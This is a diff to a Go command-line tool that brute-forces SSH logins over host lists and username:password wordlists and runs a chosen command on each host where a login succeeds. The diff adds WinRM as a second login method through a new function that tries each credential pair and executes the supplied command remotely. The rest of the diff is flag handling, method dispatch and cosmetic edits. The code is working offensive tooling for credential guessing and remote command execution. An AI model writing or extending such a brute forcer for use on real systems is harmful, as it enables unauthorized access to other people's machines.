@@ -1,7 +1,7 @@
 package main
 
 import (
-	"flag"
+    "flag"
 	"time"
 	"fmt"
 	"bufio"
@@ -13,6 +13,7 @@ import (
 
 	"github.com/fatih/color"
 	"golang.org/x/crypto/ssh"
+	"github.com/masterzen/winrm"
 )
 
 var serverLog *os.File
@@ -21,7 +22,7 @@ var (
 	inittime = time.Now()
 
 	// Starting w/ just ssh as a poc
-	method = flag.String("method", "ssh", "the auth mechanism to use for the brute force")
+	method = flag.String("method", "", "the auth mechanism to use for the brute force")
 	exec = flag.String("exec", "", "a single command to execute when auth is successful")
 
 	hosts = []string{}
@@ -30,21 +31,21 @@ var (
 	
 	creds = []string{}
 	cred = flag.String("cred", "", "a single un:pw credential pair to use")
-	credList = flag.String("credList", "", "a username:password combo wordlist list, with unique un:pw combos on each line")
+    credList = flag.String("credList", "", "a username:password combo wordlist list, with unique un:pw combos on each line")
 
 	// users = []string{}
 	// user = flag.String("user", "root", "indicate user to brute force")
 	// userList = flag.String("userList", "userList.txt", "indicate wordlist file that has users on each line")
 	// passwords = []string{}
-	// password = flag.String("password", "toor", "indicate password to use to brute force")
+    // password = flag.String("password", "toor", "indicate password to use to brute force")
 	// passwordList = flag.String("passwordList", "passwordList.txt", "indicate wordlist file that has passwords on each line")
 
 	nobanner = flag.Bool("nobanner", false, "set this to true to silence the banner when run")
-	verbose = flag.Bool("verbose", false, "verbosly send messages to the console")
-	logName = flag.String("logName", "logFile.txt", "indicate a file to log verbosly to")
-	log = flag.Bool("log", false, "indicate a file to log successful auths to")
+    verbose = flag.Bool("verbose", false, "verbosly send messages to the console")
+    logName = flag.String("logName", "logFile.txt", "indicate a file to log verbosly to")
+    log = flag.Bool("log", false, "indicate a file to log successful auths to")
 
-	delay = flag.Duration("delay", 0, "add a delay to each scan")
+    delay = flag.Duration("delay", 0, "add a delay to each scan")
 	timeout = flag.Duration("timeout", 300*time.Millisecond, "set timeout for an ssh response")
 )
 
@@ -110,12 +111,38 @@ func sshcon(target, user, password, command string) *resp {
 	return response
 }
 
+func winrmcon(target, user, password, command string) {
+	// Split our target on : by host:port
+	tz := strings.Split(target, ":")
+	tzh, tzp := tz[0], tz[1]
+	tzpi, _ := strconv.Atoi(tzp)
+	// tzh for host and tzp for port (tzpi is the int type of the port), default winrm is 5985 or 5986
+	endpoint := winrm.NewEndpoint(tzh, tzpi, false, false, nil, nil, nil, 0)
+	client, err := winrm.NewClient(endpoint, user, password)
+	if ((err != nil) && (*verbose == true)) {
+		message("warn", "Errors creating winrm connection: " + err.Error())
+		return
+	} else if (*verbose == true) {
+		message("note", "started winrm connection to host "+target+" with un:pw - " + user +":"+password)
+	}
+	//var stdoutBuf bytes.Buffer
+	_, err = client.Run(command, os.Stdout, os.Stderr)
+		if ((err != nil) && (*verbose == true)) {
+			message("warn", "Errors running command: " + command + " - " + err.Error())
+			return
+		} else {
+			message("success", "winrm connection to host "+target+" with un:pw - " + user +":"+password)
+			return
+		}
+		//message("success", "winrm connection to host "+target+" with un:pw - " + user +":"+password)
+}
+
 func main() {
 	// Get current working path
 	ex, err := os.Executable()
-    	if err != nil {
-        	panic(err)
-    	}
+    if err != nil {
+        panic(err)
+    }
 	exPath := filepath.Dir(ex)
 	// Parse flags
 	flag.Parse()
@@ -153,7 +180,12 @@ func main() {
 		message("info", "hostList flag: "+hostListFlag.Value.String())
 		message("info", "cred flag: "+credFlag.Value.String())	
 		message("info", "credList flag: "+credListFlag.Value.String())	
+		message("info", "exec flag: "+ *exec)
+		message("info", "method flag: "+ *method)		
 	}
+	
+	// Make sure an auth method has been selected
+	if (*method == "" ){ message("warn", "No auth method selected! (ssh or winrm)"); return }
 
 	// Collect our hosts first
 	if ((*host != "") || (*hostList != "")){ 
@@ -191,7 +223,7 @@ func main() {
 									message("info", "Trying hostIndex: "+strconv.Itoa(hostIndex+1)+", host - " + singleHost)
 								}
 								// Only supported auth mechanism right now
-								//if (method == "ssh"){
+								if (*method == "ssh"){
 									resp := sshcon(singleHost, un, pw, *exec)
 									if resp.Error != nil {
 										if (*verbose == true) {
@@ -200,7 +232,11 @@ func main() {
 									} else {
 										//message("success", "Success!!")
 									}
-								//} // Closing bracket for other methods
+								} else if (*method == "winrm") {
+									winrmcon(singleHost, un, pw, *exec)
+								} else {
+									message("warn", "Select a method: ssh or winrm")
+								}
 							}
 							// Add delay here ?
 							time.Sleep(*delay)
@@ -277,4 +313,7 @@ const Banner1 string = `
                          *&@@@@%*       *&@%(.            ,#%@@@&&&@@@@@@&/                                                        
                             .(&@@@@%#/,.   /#&@%/.           .,(@@@@@,                                                           
                                 .*#&@@@@@@@@@@@@@@@@@@@@@@@@@@@&%/,                                                                
-                                        .,*((##%%%%%%#(/*,.                      `
+                                	.,*((##%%%%%%#(/*,.                      
+        				    \(.@GRS@.)/,  
+.	.	.	.	.	.	.	.	.	.	.	.	.								
+.	.	.	.	.	.	.	.	.	.	.	.	.								`
